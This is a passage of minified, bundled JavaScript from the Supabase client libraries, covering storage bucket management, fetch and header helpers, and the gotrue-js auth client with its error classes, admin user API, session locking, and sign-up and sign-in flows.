a=Object.assign(Object.assign(Object.assign({},s3),r),{prefix:t||""});return{data:yield ji(this.fetch,`${this.url}/object/list/${this.bucketId}`,a,{headers:this.headers},s),error:null}}catch(a){if(ot(a))return{data:null,error:a};throw a}})}_getFinalPath(t){return`${this.bucketId}/${t}`}_removeEmptyFolders(t){return t.replace(/^\/|\/$/g,"").replace(/\/+/g,"/")}transformOptsToQueryString(t){const r=[];return t.width&&r.push(`width=${t.width}`),t.height&&r.push(`height=${t.height}`),t.resize&&r.push(`resize=${t.resize}`),t.format&&r.push(`format=${t.format}`),t.quality&&r.push(`quality=${t.quality}`),r.join("&")}}const a3="2.5.5",l3={"X-Client-Info":`storage-js/${a3}`};var Wn=function(n,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(n,t||[])).next())})};class c3{constructor(t,r={},s){this.url=t,this.headers=Object.assign(Object.assign({},l3),r),this.fetch=Wy(s)}listBuckets(){return Wn(this,void 0,void 0,function*(){try{return{data:yield td(this.fetch,`${this.url}/bucket`,{headers:this.headers}),error:null}}catch(t){if(ot(t))return{data:null,error:t};throw t}})}getBucket(t){return Wn(this,void 0,void 0,function*(){try{return{data:yield td(this.fetch,`${this.url}/bucket/${t}`,{headers:this.headers}),error:null}}catch(r){if(ot(r))return{data:null,error:r};throw r}})}createBucket(t,r={public:!1}){return Wn(this,void 0,void 0,function*(){try{return{data:yield ji(this.fetch,`${this.url}/bucket`,{id:t,name:t,public:r.public,file_size_limit:r.fileSizeLimit,allowed_mime_types:r.allowedMimeTypes},{headers:this.headers}),error:null}}catch(s){if(ot(s))return{data:null,error:s};throw s}})}updateBucket(t,r){return Wn(this,void 0,void 0,function*(){try{return{data:yield r3(this.fetch,`${this.url}/bucket/${t}`,{id:t,name:t,public:r.public,file_size_limit:r.fileSizeLimit,allowed_mime_types:r.allowedMimeTypes},{headers:this.headers}),error:null}}catch(s){if(ot(s))return{data:null,error:s};throw s}})}emptyBucket(t){return Wn(this,void 0,void 0,function*(){try{return{data:yield ji(this.fetch,`${this.url}/bucket/${t}/empty`,{},{headers:this.headers}),error:null}}catch(r){if(ot(r))return{data:null,error:r};throw r}})}deleteBucket(t){return Wn(this,void 0,void 0,function*(){try{return{data:yield Hy(this.fetch,`${this.url}/bucket/${t}`,{},{headers:this.headers}),error:null}}catch(r){if(ot(r))return{data:null,error:r};throw r}})}}class d3 extends c3{constructor(t,r={},s){super(t,r,s)}from(t){return new o3(this.url,this.headers,t,this.fetch)}}const u3="2.39.1";let Xr="";typeof Deno<"u"?Xr="deno":typeof document<"u"?Xr="web":typeof navigator<"u"&&navigator.product==="ReactNative"?Xr="react-native":Xr="node";const h3={"X-Client-Info":`supabase-js-${Xr}/${u3}`};var p3=function(n,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(n,t||[])).next())})};const f3=n=>{let t;return n?t=n:typeof fetch>"u"?t=Bd:t=fetch,(...r)=>t(...r)},g3=()=>typeof Headers>"u"?Fy:Headers,m3=(n,t,r)=>{const s=f3(r),a=g3();return(c,d)=>p3(void 0,void 0,void 0,function*(){var h;const p=(h=yield t())!==null&&h!==void 0?h:n;let f=new a(d?.headers);return f.has("apikey")||f.set("apikey",n),f.has("Authorization")||f.set("Authorization",`Bearer ${p}`),s(c,Object.assign(Object.assign({},d),{headers:f}))})};function y3(n){return n.replace(/\/$/,"")}function b3(n,t){const{db:r,auth:s,realtime:a,global:c}=n,{db:d,auth:h,realtime:p,global:f}=t;return{db:Object.assign(Object.assign({},d),r),auth:Object.assign(Object.assign({},h),s),realtime:Object.assign(Object.assign({},p),a),global:Object.assign(Object.assign({},f),c)}}function v3(n){return Math.round(Date.now()/1e3)+n}function w3(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(n){const t=Math.random()*16|0;return(n=="x"?t:t&3|8).toString(16)})}const Wt=()=>typeof document<"u",tn={tested:!1,writable:!1},ss=()=>{if(!Wt())return!1;try{if(typeof globalThis.localStorage!="object")return!1}catch{return!1}if(tn.tested)return tn.writable;const n=`lswt-${Math.random()}${Math.random()}`;try{globalThis.localStorage.setItem(n,n),globalThis.localStorage.removeItem(n),tn.tested=!0,tn.writable=!0}catch{tn.tested=!0,tn.writable=!1}return tn.writable};function Ic(n){const t={},r=new URL(n);if(r.hash&&r.hash[0]==="#")try{new URLSearchParams(r.hash.substring(1)).forEach((a,c)=>{t[c]=a})}catch{}return r.searchParams.forEach((s,a)=>{t[a]=s}),t}const $y=n=>{let t;return n?t=n:typeof fetch>"u"?t=(...r)=>nr(async()=>{const{default:s}=await Promise.resolve().then(()=>ms);return{default:s}},void 0).then(({default:s})=>s(...r)):t=fetch,(...r)=>t(...r)},k3=n=>typeof n=="object"&&n!==null&&"status"in n&&"ok"in n&&"json"in n&&typeof n.json=="function",nn=async(n,t,r)=>{await n.setItem(t,JSON.stringify(r))},Lo=async(n,t)=>{const r=await n.getItem(t);if(!r)return null;try{return JSON.parse(r)}catch{return r}},_c=async(n,t)=>{await n.removeItem(t)};function x3(n){const t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";let r="",s,a,c,d,h,p,f,m=0;for(n=n.replace("-","+").replace("_","/");m<n.length;)d=t.indexOf(n.charAt(m++)),h=t.indexOf(n.charAt(m++)),p=t.indexOf(n.charAt(m++)),f=t.indexOf(n.charAt(m++)),s=d<<2|h>>4,a=(h&15)<<4|p>>2,c=(p&3)<<6|f,r=r+String.fromCharCode(s),p!=64&&a!=0&&(r=r+String.fromCharCode(a)),f!=64&&c!=0&&(r=r+String.fromCharCode(c));return r}class da{constructor(){this.promise=new da.promiseConstructor((t,r)=>{this.resolve=t,this.reject=r})}}da.promiseConstructor=Promise;function hg(n){const t=/^([a-z0-9_-]{4})*($|[a-z0-9_-]{3}=?$|[a-z0-9_-]{2}(==)?$)$/i,r=n.split(".");if(r.length!==3)throw new Error("JWT is not valid: not a JWT structure");if(!t.test(r[1]))throw new Error("JWT is not valid: payload is not in base64url format");const s=r[1];return JSON.parse(x3(s))}async function T3(n){return await new Promise(t=>{setTimeout(()=>t(null),n)})}function S3(n,t){return new Promise((s,a)=>{(async()=>{for(let c=0;c<1/0;c++)try{const d=await n(c);if(!t(c,null,d)){s(d);return}}catch(d){if(!t(c,d)){a(d);return}}})()})}function A3(n){return("0"+n.toString(16)).substr(-2)}function Hn(){const t=new Uint32Array(56);if(typeof crypto>"u"){const r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~",s=r.length;let a="";for(let c=0;c<56;c++)a+=r.charAt(Math.floor(Math.random()*s));return a}return crypto.getRandomValues(t),Array.from(t,A3).join("")}async function C3(n){const r=new TextEncoder().encode(n),s=await crypto.subtle.digest("SHA-256",r),a=new Uint8Array(s);return Array.from(a).map(c=>String.fromCharCode(c)).join("")}function P3(n){return btoa(n).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"")}async function $n(n){if(!(typeof crypto<"u"&&typeof crypto.subtle<"u"&&typeof TextEncoder<"u"))return console.warn("WebCrypto API is not supported. Code challenge method will default to use plain instead of sha256."),n;const r=await C3(n);return P3(r)}class Ud extends Error{constructor(t,r){super(t),this.__isAuthError=!0,this.name="AuthError",this.status=r}}function ye(n){return typeof n=="object"&&n!==null&&"__isAuthError"in n}class E3 extends Ud{constructor(t,r){super(t,r),this.name="AuthApiError",this.status=r}toJSON(){return{name:this.name,message:this.message,status:this.status}}}function I3(n){return ye(n)&&n.name==="AuthApiError"}class Gy extends Ud{constructor(t,r){super(t),this.name="AuthUnknownError",this.originalError=r}}class yn extends Ud{constructor(t,r,s){super(t),this.name=r,this.status=s}toJSON(){return{name:this.name,message:this.message,status:this.status}}}class Gn extends yn{constructor(){super("Auth session missing!","AuthSessionMissingError",400)}}class Rc extends yn{constructor(){super("Auth session or user missing","AuthInvalidTokenResponseError",500)}}class Oo extends yn{constructor(t){super(t,"AuthInvalidCredentialsError",400)}}class Bo extends yn{constructor(t,r=null){super(t,"AuthImplicitGrantRedirectError",500),this.details=null,this.details=r}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}class pg extends yn{constructor(t,r=null){super(t,"AuthPKCEGrantCodeExchangeError",500),this.details=null,this.details=r}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}class id extends yn{constructor(t,r){super(t,"AuthRetryableFetchError",r)}}function Dc(n){return ye(n)&&n.name==="AuthRetryableFetchError"}class _3 extends yn{constructor(t,r,s){super(t,"AuthWeakPasswordError",r),this.reasons=s}}var R3=function(n,t){var r={};for(var s in n)Object.prototype.hasOwnProperty.call(n,s)&&t.indexOf(s)<0&&(r[s]=n[s]);if(n!=null&&typeof Object.getOwnPropertySymbols=="function")for(var a=0,s=Object.getOwnPropertySymbols(n);a<s.length;a++)t.indexOf(s[a])<0&&Object.prototype.propertyIsEnumerable.call(n,s[a])&&(r[s[a]]=n[s[a]]);return r};const Jn=n=>n.msg||n.message||n.error_description||n.error||JSON.stringify(n),D3=[502,503,504];async function fg(n){if(!k3(n))throw new id(Jn(n),0);if(D3.includes(n.status))throw new id(Jn(n),n.status);let t;try{t=await n.json()}catch(r){throw new Gy(Jn(r),r)}throw typeof t=="object"&&t&&typeof t.weak_password=="object"&&t.weak_password&&Array.isArray(t.weak_password.reasons)&&t.weak_password.reasons.length&&t.weak_password.reasons.reduce((r,s)=>r&&typeof s=="string",!0)?new _3(Jn(t),n.status,t.weak_password.reasons):new E3(Jn(t),n.status||500)}const M3=(n,t,r,s)=>{const a={method:n,headers:t?.headers||{}};return n==="GET"?a:(a.headers=Object.assign({"Content-Type":"application/json;charset=UTF-8"},t?.headers),a.body=JSON.stringify(s),Object.assign(Object.assign({},a),r))};async function ve(n,t,r,s){var a;const c=Object.assign({},s?.headers);s?.jwt&&(c.Authorization=`Bearer ${s.jwt}`);const d=(a=s?.query)!==null&&a!==void 0?a:{};s?.redirectTo&&(d.redirect_to=s.redirectTo);const h=Object.keys(d).length?"?"+new URLSearchParams(d).toString():"",p=await j3(n,t,r+h,{headers:c,noResolveJson:s?.noResolveJson},{},s?.body);return s?.xform?s?.xform(p):{data:Object.assign({},p),error:null}}async function j3(n,t,r,s,a,c){const d=M3(t,s,a,c);let h;try{h=await n(r,d)}catch(p){throw console.error(p),new id(Jn(p),0)}if(h.ok||await fg(h),s?.noResolveJson)return h;try{return await h.json()}catch(p){await fg(p)}}function an(n){var t;let r=null;N3(n)&&(r=Object.assign({},n),n.expires_at||(r.expires_at=v3(n.expires_in)));const s=(t=n.user)!==null&&t!==void 0?t:n;return{data:{session:r,user:s},error:null}}function gg(n){const t=an(n);return!t.error&&n.weak_password&&typeof n.weak_password=="object"&&Array.isArray(n.weak_password.reasons)&&n.weak_password.reasons.length&&n.weak_password.message&&typeof n.weak_password.message=="string"&&n.weak_password.reasons.reduce((r,s)=>r&&typeof s=="string",!0)&&(t.data.weak_password=n.weak_password),t}function Li(n){var t;return{data:{user:(t=n.user)!==null&&t!==void 0?t:n},error:null}}function L3(n){return{data:n,error:null}}function O3(n){const{action_link:t,email_otp:r,hashed_token:s,redirect_to:a,verification_type:c}=n,d=R3(n,["action_link","email_otp","hashed_token","redirect_to","verification_type"]),h={action_link:t,email_otp:r,hashed_token:s,redirect_to:a,verification_type:c},p=Object.assign({},d);return{data:{properties:h,user:p},error:null}}function B3(n){return n}function N3(n){return n.access_token&&n.refresh_token&&n.expires_in}var F3=function(n,t){var r={};for(var s in n)Object.prototype.hasOwnProperty.call(n,s)&&t.indexOf(s)<0&&(r[s]=n[s]);if(n!=null&&typeof Object.getOwnPropertySymbols=="function")for(var a=0,s=Object.getOwnPropertySymbols(n);a<s.length;a++)t.indexOf(s[a])<0&&Object.prototype.propertyIsEnumerable.call(n,s[a])&&(r[s[a]]=n[s[a]]);return r};class z3{constructor({url:t="",headers:r={},fetch:s}){this.url=t,this.headers=r,this.fetch=$y(s),this.mfa={listFactors:this._listFactors.bind(this),deleteFactor:this._deleteFactor.bind(this)}}async signOut(t,r="global"){try{return await ve(this.fetch,"POST",`${this.url}/logout?scope=${r}`,{headers:this.headers,jwt:t,noResolveJson:!0}),{data:null,error:null}}catch(s){if(ye(s))return{data:null,error:s};throw s}}async inviteUserByEmail(t,r={}){try{return await ve(this.fetch,"POST",`${this.url}/invite`,{body:{email:t,data:r.data},headers:this.headers,redirectTo:r.redirectTo,xform:Li})}catch(s){if(ye(s))return{data:{user:null},error:s};throw s}}async generateLink(t){try{const{options:r}=t,s=F3(t,["options"]),a=Object.assign(Object.assign({},s),r);return"newEmail"in s&&(a.new_email=s?.newEmail,delete a.newEmail),await ve(this.fetch,"POST",`${this.url}/admin/generate_link`,{body:a,headers:this.headers,xform:O3,redirectTo:r?.redirectTo})}catch(r){if(ye(r))return{data:{properties:null,user:null},error:r};throw r}}async createUser(t){try{return await ve(this.fetch,"POST",`${this.url}/admin/users`,{body:t,headers:this.headers,xform:Li})}catch(r){if(ye(r))return{data:{user:null},error:r};throw r}}async listUsers(t){var r,s,a,c,d,h,p;try{const f={nextPage:null,lastPage:0,total:0},m=await ve(this.fetch,"GET",`${this.url}/admin/users`,{headers:this.headers,noResolveJson:!0,query:{page:(s=(r=t?.page)===null||r===void 0?void 0:r.toString())!==null&&s!==void 0?s:"",per_page:(c=(a=t?.perPage)===null||a===void 0?void 0:a.toString())!==null&&c!==void 0?c:""},xform:B3});if(m.error)throw m.error;const y=await m.json(),v=(d=m.headers.get("x-total-count"))!==null&&d!==void 0?d:0,w=(p=(h=m.headers.get("link"))===null||h===void 0?void 0:h.split(","))!==null&&p!==void 0?p:[];return w.length>0&&(w.forEach(E=>{const T=parseInt(E.split(";")[0].split("=")[1].substring(0,1)),C=JSON.parse(E.split(";")[1].split("=")[1]);f[`${C}Page`]=T}),f.total=parseInt(v)),{data:Object.assign(Object.assign({},y),f),error:null}}catch(f){if(ye(f))return{data:{users:[]},error:f};throw f}}async getUserById(t){try{return await ve(this.fetch,"GET",`${this.url}/admin/users/${t}`,{headers:this.headers,xform:Li})}catch(r){if(ye(r))return{data:{user:null},error:r};throw r}}async updateUserById(t,r){try{return await ve(this.fetch,"PUT",`${this.url}/admin/users/${t}`,{body:r,headers:this.headers,xform:Li})}catch(s){if(ye(s))return{data:{user:null},error:s};throw s}}async deleteUser(t,r=!1){try{return await ve(this.fetch,"DELETE",`${this.url}/admin/users/${t}`,{headers:this.headers,body:{should_soft_delete:r},xform:Li})}catch(s){if(ye(s))return{data:{user:null},error:s};throw s}}async _listFactors(t){try{const{data:r,error:s}=await ve(this.fetch,"GET",`${this.url}/admin/users/${t.userId}/factors`,{headers:this.headers,xform:a=>({data:{factors:a},error:null})});return{data:r,error:s}}catch(r){if(ye(r))return{data:null,error:r};throw r}}async _deleteFactor(t){try{return{data:await ve(this.fetch,"DELETE",`${this.url}/admin/users/${t.userId}/factors/${t.id}`,{headers:this.headers}),error:null}}catch(r){if(ye(r))return{data:null,error:r};throw r}}}const qy="2.62.0",U3="http://localhost:9999",V3="supabase.auth.token",W3={"X-Client-Info":`gotrue-js/${qy}`},mg=10,H3={getItem:n=>ss()?globalThis.localStorage.getItem(n):null,setItem:(n,t)=>{ss()&&globalThis.localStorage.setItem(n,t)},removeItem:n=>{ss()&&globalThis.localStorage.removeItem(n)}};function yg(n={}){return{getItem:t=>n[t]||null,setItem:(t,r)=>{n[t]=r},removeItem:t=>{delete n[t]}}}function $3(){if(typeof globalThis!="object")try{Object.defineProperty(Object.prototype,"__magic__",{get:function(){return this},configurable:!0}),__magic__.globalThis=__magic__,delete Object.prototype.__magic__}catch{typeof self<"u"&&(self.globalThis=self)}}const qn={debug:!!(globalThis&&ss()&&globalThis.localStorage&&globalThis.localStorage.getItem("supabase.gotrue-js.locks.debug")==="true")};class Ky extends Error{constructor(t){super(t),this.isAcquireTimeout=!0}}class G3 extends Ky{}async function q3(n,t,r){qn.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquire lock",n,t);const s=new globalThis.AbortController;return t>0&&setTimeout(()=>{s.abort(),qn.debug&&console.log("@supabase/gotrue-js: navigatorLock acquire timed out",n)},t),await globalThis.navigator.locks.request(n,t===0?{mode:"exclusive",ifAvailable:!0}:{mode:"exclusive",signal:s.signal},async a=>{if(a){qn.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquired",n,a.name);try{return await r()}finally{qn.debug&&console.log("@supabase/gotrue-js: navigatorLock: released",n,a.name)}}else{if(t===0)throw qn.debug&&console.log("@supabase/gotrue-js: navigatorLock: not immediately available",n),new G3(`Acquiring an exclusive Navigator LockManager lock "${n}" immediately failed`);if(qn.debug)try{const c=await globalThis.navigator.locks.query();console.log("@supabase/gotrue-js: Navigator LockManager state",JSON.stringify(c,null,"  "))}catch(c){console.warn("@supabase/gotrue-js: Error when querying Navigator LockManager state",c)}return console.warn("@supabase/gotrue-js: Navigator LockManager returned a null lock when using #request without ifAvailable set to true, it appears this browser is not following the LockManager spec https://developer.mozilla.org/en-US/docs/Web/API/LockManager/request"),await r()}})}$3();const K3={url:U3,storageKey:V3,autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,headers:W3,flowType:"implicit",debug:!1},Qr=30*1e3,bg=3;async function vg(n,t,r){return await r()}class ds{constructor(t){var r,s;this.memoryStorage=null,this.stateChangeEmitters=new Map,this.autoRefreshTicker=null,this.visibilityChangedCallback=null,this.refreshingDeferred=null,this.initializePromise=null,this.detectSessionInUrl=!0,this.lockAcquired=!1,this.pendingInLock=[],this.broadcastChannel=null,this.logger=console.log,this.instanceID=ds.nextInstanceID,ds.nextInstanceID+=1,this.instanceID>0&&Wt()&&console.warn("Multiple GoTrueClient instances detected in the same browser context. It is not an error, but this should be avoided as it may produce undefined behavior when used concurrently under the same storage key.");const a=Object.assign(Object.assign({},K3),t);if(this.logDebugMessages=!!a.debug,typeof a.debug=="function"&&(this.logger=a.debug),this.persistSession=a.persistSession,this.storageKey=a.storageKey,this.autoRefreshToken=a.autoRefreshToken,this.admin=new z3({url:a.url,headers:a.headers,fetch:a.fetch}),this.url=a.url,this.headers=a.headers,this.fetch=$y(a.fetch),this.lock=a.lock||vg,this.detectSessionInUrl=a.detectSessionInUrl,this.flowType=a.flowType,a.lock?this.lock=a.lock:Wt()&&(!((r=globalThis?.navigator)===null||r===void 0)&&r.locks)?this.lock=q3:this.lock=vg,this.mfa={verify:this._verify.bind(this),enroll:this._enroll.bind(this),unenroll:this._unenroll.bind(this),challenge:this._challenge.bind(this),listFactors:this._listFactors.bind(this),challengeAndVerify:this._challengeAndVerify.bind(this),getAuthenticatorAssuranceLevel:this._getAuthenticatorAssuranceLevel.bind(this)},this.persistSession?a.storage?this.storage=a.storage:ss()?this.storage=H3:(this.memoryStorage={},this.storage=yg(this.memoryStorage)):(this.memoryStorage={},this.storage=yg(this.memoryStorage)),Wt()&&globalThis.BroadcastChannel&&this.persistSession&&this.storageKey){try{this.broadcastChannel=new globalThis.BroadcastChannel(this.storageKey)}catch(c){console.error("Failed to create a new BroadcastChannel, multi-tab state changes will not be available",c)}(s=this.broadcastChannel)===null||s===void 0||s.addEventListener("message",async c=>{this._debug("received broadcast notification from other tab or client",c),await this._notifyAllSubscribers(c.data.event,c.data.session,!1)})}this.initialize()}_debug(...t){return this.logDebugMessages&&this.logger(`GoTrueClient@${this.instanceID} (${qy}) ${new Date().toISOString()}`,...t),this}async initialize(){return this.initializePromise?await this.initializePromise:(this.initializePromise=(async()=>await this._acquireLock(-1,async()=>await this._initialize()))(),await this.initializePromise)}async _initialize(){try{const t=Wt()?await this._isPKCEFlow():!1;if(this._debug("#_initialize()","begin","is PKCE flow",t),t||this.detectSessionInUrl&&this._isImplicitGrantFlow()){const{data:r,error:s}=await this._getSessionFromURL(t);if(s)return this._debug("#_initialize()","error detecting session from URL",s),s?.message==="Identity is already linked"||s?.message==="Identity is already linked to another user"?{error:s}:(await this._removeSession(),{error:s});const{session:a,redirectType:c}=r;return this._debug("#_initialize()","detected session in URL",a,"redirect type",c),await this._saveSession(a),setTimeout(async()=>{c==="recovery"?await this._notifyAllSubscribers("PASSWORD_RECOVERY",a):await this._notifyAllSubscribers("SIGNED_IN",a)},0),{error:null}}return await this._recoverAndRefresh(),{error:null}}catch(t){return ye(t)?{error:t}:{error:new Gy("Unexpected error during initialization",t)}}finally{await this._handleVisibilityChange(),this._debug("#_initialize()","end")}}async signUp(t){var r,s,a;try{await this._removeSession();let c;if("email"in t){const{email:m,password:y,options:v}=t;let w=null,E=null;if(this.flowType==="pkce"){const T=Hn();await nn(this.storage,`${this.storageKey}-code-verifier`,T),w=await $n(T),E=T===w?"plain":"s256"}c=await ve(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,redirectTo:v?.emailRedirectTo,body:{email:m,password:y,data:(r=v?.data)!==null&&r!==void 0?r:{},gotrue_meta_security:{captcha_token:v?.captchaToken},code_challenge:w,code_challenge_method:E},xform:an})}else if("phone"in t){const{phone:m,password:y,options:v}=t;c=await ve(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,body:{phone:m,password:y,data:(s=v?.data)!==null&&s!==void 0?s:{},channel:(a=v?.channel)!==null&&a!==void 0?a:"sms",gotrue_meta_security:{captcha_token:v?.captchaToken}},xform:an})}else throw new Oo("You must provide either an email or phone number and a password");const{data:d,error:h}=c;if(h||!d)return{data:{user:null,session:null},error:h};const p=d.session,f=d.user;return d.session&&(await this._saveSession(d.session),await this._notifyAllSubscribers("SIGNED_IN",p)),{data:{user:f,session:p},error:null}}catch(c){if(ye(c))return{data:{user:null,session:null},error:c};throw c}}async signInWithPassword(t){try{await this._removeSession();let r;if("email"in t){const{email:c,password:d,options:h}=t;r=await ve(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{email:c,password:d,gotrue_meta_security:{captcha_token:h?.captchaToken}},xform:gg})}else if("phone"in t){const{phone:c,password:d,options:h}=t;r=await ve(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{phone:c,password:d,gotrue_meta_security:{captcha_token:h?.captchaToken}},xform:gg})}else throw new Oo("You must provide either an email or phone number and a password");const{data:s,error:a}=r;return a?{data:{user:null,session:null},error:a}:!s||!s.session||!s.user?{data:{user:null,session:null},error:new Rc}:(s.session&&(await this._saveSession(s.session),await this._notifyAllSubscribers("SIGNED_IN",s.session)),{data:Object.assign({user:s.user,session:s.session},s.weak_password?{weakPassword:s.weak_password}:null),error:a})}catch(r){if(ye(r))return{data:{user:null,session:null},error:r};throw r}}async signInWithOAuth(t){var r,s,a,c;return await this._removeSession(),await this._handleProviderSignIn(t.provider,{redirectTo:(r=t.options)===null||r===void 0?void 0:r.redirectTo,scopes:(s=t.options)===null||s===void 0?void 0:s.scopes,queryParams:(a=t.options)===null||a===void 0?void 0:a.queryParams,skipBrowserRedirect:(c=t.options)===null||c===void 0?void 0:c.skipBrowserRedirect})}async exchangeCodeForSession(t){return await this.initializePromise,this._acquireLock(-1,async()=>this._exchangeCodeForSession(t))}async _exchangeCodeForSession(t){const r=await Lo(this.storage,`${this.storageKey}-code-verifier`),[s,a]=(r??"").split("/"),{data:c,error:d}=await ve(this.fetch,"POST",`${this.url}/token?grant_type=pkce`,{headers:this.headers,body:{auth_code:t,code_verifier:s},xform:an});return await _c(this.storage,`${this.storageKey}-code-verifier`),d?{data:{user:null,session:null,redirectType:null},error:d}:!c||!c.session||!c.user?{data:{user:null,session:null,redirectType:null},error:new Rc}:(c.session&&(await this._saveSession(c.session),await this._notifyAllSubscribers("SIGNED_IN",c.session)),{data:Object.assign(Object.assign({},c),{redirectType:a??null}),error:d})}async signInWithIdToken(t){await this._removeSession();try{const{options:r,provider:s,token:a,access_token:c,nonce:d}=t,h=await ve(this.fetch,"POST",`${this.url}/token?grant_type=id_token`,{headers:this.headers,body:{provider:s,id_token:a,access_token:c,nonce:d,gotrue_meta_security:{captcha_token:r?.captchaToken}},xform:an}),{data:p,error:f}=h;return f?{data:{user:null,session:null},error:f}:!p||!p.session||!p.user?{data:{user:null,session:null},error:new Rc}:(p.session&&(await this._saveSession(p.session),await this._notifyAllSubscribers("SIGNED_IN",p.session)),{data:p,error:f})}catch(r){if(ye(r))return{data:{user:null,session:null},error:r};throw r}}async signInWithOtp(t){var r,s,a,c,d;try{if(await this._removeSession(),"email"in t){const{email:h,options:p}=t;let f=null,m=null;if(this.flowType==="pkce"){const v=Hn();await nn(this.storage,`${this.storageKey}-code-verifier`,v),f=await $n(v),m=v===f?"plain":"s256"}const{error:y}=await ve(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{email:h,data:(r=p?.data)!==null&&r!==void 0?r:{},create_user:(s=p?.shouldCreateUser)!==null&&s!==void 0?s:!0,gotrue_meta_security:{captcha_token:p?.captchaToken},code_challenge:f,code_challenge_method:m},redirectTo:p?.emailRedirectTo});return{data:{user:null,session:null},error:y}}if("phone"in t){const{phone:h,options:p}=t,{data:f,error:m}=await ve(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{phone:h,data:(a=p?.data)!==null&&a!==void 0?a:{},create_user:(c=p?.shouldCreateUser)!==null&&c!==void 0?c:!0,gotrue_meta_security:{captcha_token:p?.captchaToken},channel:(d=p?.channel)!==null&&d!==void 0?d:"sms"}});return{data:{user:null,session:null,messageId:f?.message_id},error:m}}throw new Oo("You must provide either an email or phone number.")}catch(h){if(ye(h))return{data:{user:null,session:null},error:h};throw h}}async verifyOtp(t){var r,s;try{t.type!=="email_change"&&t.type!=="phone_change"&&await this._removeSession();let a,c;"options"in t&&(a=(r=t.options)===null||r===void 0?void 0:r.redirectTo,c=(s=t.options)===null||s===void 0?void 0:s.captchaToken);const{data:d,error:h}=await ve(this.fetch,"POST",`${this.url}/verify`,{headers:this.headers,body:Object.assign(Object.assign({},t),{gotrue_meta_security:{captcha_token:c}}),redirectTo:a,xform:an});if(h)throw h;if(!d)throw new Error("An error occurred on token verification.");const p=d.session,f=d.user;return p?.access_token&&(await this._saveSession(p),await this._notifyAllSubscribers("SIGNED_IN",p)),{data:{user:f,session:p},error:null}}catch(a){if(ye(a))return{data:{user:null,session:null},error:a};throw a}}async signInWithSSO(t){var r,s,a;try{await this._removeSession();let c=null,d=null;if(this.flowType==="pkce"){const h=Hn();await nn(this.storage,`${this.storageKey}-code-verifier`,h),c=await $n(h),d=h===c?"plain":"s256"}return await ve(this.fetch,"POST",`${this.url}/sso`,{body:Object.assign(Object.assign(Object.assign(Object.assign(Object.assign({},"providerId"in t?{provider_id:t.providerId}:null),"domain"in t?{domain:t.domain}:null),{redirect_to:(s=(r=t.options)===null||r===void 0?void 0:r.redirectTo)!==null&&s!==void 0?s:void 0}),!((a=t?.options)===null||a===void 0)&&a.captchaToken?{gotrue_meta_security:{captcha_token:t.options.captchaToken}}:null),{skip_http_redirect:!0,code_challenge:c,code_challenge_method:d}),headers:this.headers,xform:L3})}catch(c){if(ye(c))return{data:null,error:c};throw c}}async reauthenticate(){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._reauthenticate())}async _reauthenticate(){try{return await this._useSession(async t=>{const{data:{session:r},error:s}=t;if(s)throw s;if(!r)throw new Gn;const{error:a}=await ve(this.fetch,"GET",`${this.url}/reauthenticate`,{headers:this.headers,jwt:r.access_token});return{data:{user:null,session:null},error:a}})}catch(t){if(ye(t))return{data:{user:null,session:null},error:t};throw t}}async resend(t){try{t.type!="email_change"&&t.type!="phone_change"&&await this._removeSession();const r=`${this.url}/resend`;if("email"in t){const{email:s,type:a,options:c}=t,{error:d}=await ve(this.fetch,"POST",r,{headers:this.headers,body:{email:s,type:a,gotrue_meta_security:{captcha_token:c?.captchaToken}},redirectTo:c?.emailRedirectTo});return{data:{user:null,session:null},error:d}}else if("phone"in t){const{phone:s,type:a,options:c}=t,{data:d,error:h}=await ve(this.fetch,"POST",r,{headers:this.headers,body:{phone:s,type:a,gotrue_meta_security:{captcha_token:c?.captchaToken}}});return{data:{user:null,session:null,messageId:d?.message_id},error:h}}throw new Oo("You must provide either an email or phone number and a type")}catch(r){if(ye(r))return{data:{user:null,session:null},error:r};throw r}}async getSession(){return await this.initializePromise,this._acquireLock(-1,async()=>this._useSession(async t=>t))}async _acquireLock(t,r){this._debug("#_acquireLock","begin",t);try{if(this.lockAcquired){const s=this.pendingInLock.length?this.pendingInLock[this.pendingInLock.length-1]:Promise.resolve(),a=(async()=>(await s,await r()))();return this.pendingInLock.push((async()=>{try{await a}catch{}})()),a}return await this.lock(`lock:${this.storageKey}`,t,async()=>{this._debug("#_acquireLock","lock acquired for storage key",this.storageKey);try{this.lockAcquired=!0;const s=r();for(this.pendingInLock.push((async()=>{try{await s}catch{}})()),await s;this.pendingInLock.length;){const a=[...this.pendingInLock];await Promise.all(a),this.pendingInLock.splice(0,a.length)}return await s}finally{this._debug("#_acquireLock","lock released for storage key",this.storageKey),this.lockAcquired=!1}})}finally{this._debug("#_acquireLock","end")}}async _useSession(t){this._debug("#_useSession","begin");try{const r=await this.__loadSession();return await t(r)}finally{this._debug("#_useSession","end")}}async __loadSession(){this._debug("#__loadSession()","begin"),this.lockAcquired||this._debug("#__loadSession()","used outside of an acquired lock!",new Error().stack);try{let t=null;const r=await 